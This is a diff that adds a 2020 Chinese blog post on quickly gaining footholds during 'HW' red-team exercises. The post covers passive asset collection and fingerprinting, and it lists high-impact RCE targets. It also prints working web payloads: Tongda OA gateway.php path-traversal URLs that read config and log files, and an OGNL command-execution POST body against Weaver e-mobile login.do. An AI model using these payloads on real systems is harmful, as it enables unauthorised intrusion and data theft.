@@ -152,6 +152,98 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/21/%E5%85%B3%E4%BA%8Ehw%E6%89%93%E7%82%B9%E7%9A%84%E6%80%9D%E8%80%83/" class="post-title-link" itemprop="url">关于hw打点的思考</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-21 09:26:01" itemprop="dateCreated datePublished" datetime="2020-08-21T09:26:01+08:00">2020-08-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 20:03:38" itemprop="dateModified" datetime="2020-09-02T20:03:38+08:00">2020-09-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
+                    <span itemprop="name">随笔</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​            一年一度的hw活动又开始了，关于hw的比拼，各个公司都十分看重，都希望能在这次比赛中拿到一个比较好的成绩，针对于hw这种形式，还是比较考验一个人或者一个团队的梭哈能力，有些红队人员虽然内网非常强，姿势也非常骚，可是打点可能不是很快，对于这种比赛来讲，就是手慢则无。反而一把梭哈，速度快还能拿到比较不错的成绩。下面我根据我的不成熟的经验来分析一下，如何提升速度。</p>
+<p>​            首先是信息搜集的能力，我们可以想一下，如果一个攻击队，信息搜集非常慢，半天才找到不多的资产，然后再去做一些常规的rce的测试，和那些有自动化工具的队伍比起来就慢了一大截，因此hw还是比较考验队伍快速搜集资产的能力，否则即使0day在手，找不到对应的平台也没用啊。关于自动化信息搜集的工具，其实可以借助一些网络资产搜集引擎，因为hw的很多蓝方精神都是高度集中，你扫个端口肯定就被拌掉了，因此最好在搜集的时候能不直接和这些目标接触并且能拿到我们想要的信息。这里我提供一个思路，就是调用各种接口搜集资产信息，找到以后再去验证存活，再获取一些指纹信息，比如网站的架构，什么cms，用了什么中间件，这些信息对我们打点来说都是非常重要的。</p>
+<p>​            然后再来谈谈挖洞，其实hw这些目标都挺大的，也就是说资产比较多，有新架构有老架构，用这种框架中间件的也非常多。那当我们拿到这么多资产后，我们该如何快速打点呢？</p>
+<p>​            我认为首先应该去找各种影响比较大的rce去检测</p>
+<p><strong>java站</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic rce  根据404报错的那个标题即可识别是否是weblogic</span><br><span class="line">struts rce		有人写了识别工具，也可以根据后缀比如.do，.action</span><br><span class="line">spring boot rce 根据404或者500的报错页面进行识别，找env文件</span><br><span class="line">shior rce       找java的登录口，看返回结果是否有remeberme 之类的字段</span><br></pre></td></tr></table></figure>
+
+<p><strong>php站</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thinkphp rce thinkphp可以根据路由来进行识别</span><br><span class="line">解析漏洞   1.jgp&#x2F;1.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>asp/aspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ueditor任意文件上传  扫ueditor的目录</span><br></pre></td></tr></table></figure>
+
+<p>​        当没有这些影响比较大的漏洞时，我们再去考虑一些cms或者一些oa这种我们知道某些版本有漏洞的站，最好还是那种已知有rce的cms。这个其实也比较依赖于大家的经验和总结能力，毕竟要跟一些爆发的漏洞也挺费精力的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通达：</span><br><span class="line">漏洞指纹：&#x2F;ispirit&#x2F;interface&#x2F;gateway.php 文件包含漏洞</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;mysql5&#x2F;my.ini&quot;&#125;</span><br><span class="line">ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;&#125;&amp;url&#x3D;&#x2F;general&#x2F;..&#x2F;..&#x2F;nginx&#x2F;logs&#x2F;oa.access.log</span><br><span class="line">泛微：</span><br><span class="line">e-mobile常在89端口 rce</span><br><span class="line">访问login.do post如下内容：</span><br><span class="line">message&#x3D;(#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd&#x3D;whoami</span><br><span class="line">泛微rce &#x2F;weaver&#x2F;bsh.servlet.BshServlet 直接访问即可执行命令</span><br></pre></td></tr></table></figure>
+
+<p>​        当这些可以直接可以利用的rce无法利用时，我们就要去找一些cms可以通过组合可以getshell的站。这些如果还没有，那我们就需要去看那些他们自己开发的网站了。去找找后台，找找上传，找找注入等等。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1866,7 +1958,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
